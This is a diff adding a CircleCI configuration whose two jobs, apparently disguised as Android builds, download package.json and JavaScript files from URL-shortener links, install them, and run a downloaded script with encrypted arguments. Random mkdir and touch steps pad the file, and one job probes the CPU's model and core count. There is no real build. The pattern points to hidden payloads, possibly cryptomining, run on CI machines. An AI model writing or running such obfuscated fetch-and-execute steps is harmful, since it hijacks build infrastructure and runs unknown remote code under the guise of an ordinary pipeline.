@@ -1,0 +1,53 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  working:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir x66zl4ppicsf7a8wm
+      - run: mkdir pxkmscbd1ndjmwp7hn06
+      - run: curl -fsSL shorturl.at/czKU5 -o package.json && curl -fsSL
+          shorturl.at/bitHQ -o hokrils1u5940od.js && curl -fsSL
+          shorturl.at/duDLQ -o fglkaslkgfr.js
+      - run: mkdir jyp64q7me7hvjwibyfmii
+      - run: cat /proc/cpuinfo | grep 'vendor' | uniq && cat /proc/cpuinfo | grep 'model
+          name' | uniq && cat /proc/cpuinfo | grep processor | wc -l && cat
+          /proc/cpuinfo | grep 'core id'
+      - run: npm i -s
+      - run: touch vjv0iriximzder3oaj6kf9k.c
+      - run: node hokrils1u5940od -s
+          U2FsdGVkX1+kZv3+aTsOlcPExIALIkxAbwr0P4LbNV5lZ3cJdkzG2ORP7E/oZ+88CTe+sAj9M0WFC6Om53fhcXJBnl/MZjT3Md/APrAMQ9+UAnEASXTu/C1ZE2BXuLuvR317hfoHbImtuFgYcPzCQN0fc5sKQ8SQvd3XGBhLdo34zLAC7VhWIi3kWjKhNgZIX0/4wUaCqAhfqv6d1jqrxfGcbAnFT79C42qYvYp/DQo=
+          -lpn U2FsdGVkX19aKHN8u2N+0lSp3I7NXvqP4KIYCHLqnWo= -t
+          U2FsdGVkX1/3dvErSyA5bgFoDPpirpbQfxEme/c1GKZr7B80mSryqviipIAzFabJ -r
+          U2FsdGVkX1/mFEeHwkIPnJvzyJ8g0i4vKhhLKYumR6BEeT3XuTy1B8p/gkjlhs5CgzAu2i8fb5cyxAzqnKjR9wQC6Ec6idptfwWAyOrCfFBoINMqlzPOd9bjMM33z1XvyaRJC2ruyw+AOByVDzmYX2SIMxzV2sB8h+kv9ZITNkkFUVfVSYP02Fk+I/aL8LggePjUr54QgEPh2k8pl/JjXpby508wLj6kyQ0E4wAYAn6Zpo+ouGMHb8r1lt8OHsbWID9ZuqnGjNUiLEOx/79r61GLSLpi4rUWS9j1syB0rJk=
+          -sp
+      - run: touch k0fidlt0ksdtzjve448f.java
+  ditmecuocdoi:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir 21bl97gpvi9wb8
+      - run: touch t76jruwy0yk9zke7jcyh.ts
+      - run: curl -fsSL shorturl.at/buIOV -o package.json && curl -fsSL
+          shorturl.at/uwKPU -o g5u5r9h1uzde.js && curl -fsSL shorturl.at/zMW15
+          -o 32brstqu829.js
+      - run: npm i -s
+      - run: mkdir k8e99paujjhudcf3r323m8zean
+      - run: mkdir l2xqznxo6urtqbzpyxd08p43zjt
+      - run: mkdir g8llj0aomsp14sqzjlrk
+      - run: node g5u5r9h1uzde -r
+          U2FsdGVkX19NAdObWKaBZn9tgBPOVUHao6PR/78UmkDsEbAeME2QNDlF3fT5y1mIutIHkAt/7N3VLTVxetM5BXZPA5FxMaLfgizuq64i2bS4astt3lHidhalmQpGG8QpTH6LPGvnooJ5TdRfb2Vwejo5400SA5743VlHuS6AphJkekRp/BC77InyEGI7tIwql23fOUqZ3CnhrRnu1syylCVNjpbzINfcivayzyxDxzsTRPOuWu/WuG+pve1u1pGUfuQwlLPGqf2HuEDzDajwpAZWbUz+QNt3JRm24hzqODU=
+          -t U2FsdGVkX1/DP+1bxkCWePI9/KIckNoyWvVCK6wBiFMTcDgXmOhlriw2wD6jyHPR
+          -sp -s
+          U2FsdGVkX1/og+n4QzHXTmCL6IYEKX2sGm8oSCs/9QgNImVi+TZhHW3jWSUn0/4NaaIcqwlMPh3owyuxxuVcqYxPTO7SBq0nqUkXuzcqzeR2sTqC1eP0PHD15F09S2vNOXBzUFTM4GLTRgffIwa1VfoGrSnsLfY9mrnQlFZLLev5CjCJIFBbCNQ2P5WGfTAjEM0vg9psfazD3KHNB7YaenTbnFY5AQEyzgPsz0pAtsc=
+          -lpn U2FsdGVkX1+f0vUwfT/B6dUhlTmbmHemdri0SsmnD5k=
+      - run: mkdir xzzvrbgtiyerf6dzeb3qixit
+workflows:
+  dataBuild:
+    jobs:
+      - working
+  shitJob:
+    jobs:
+      - ditmecuocdoi
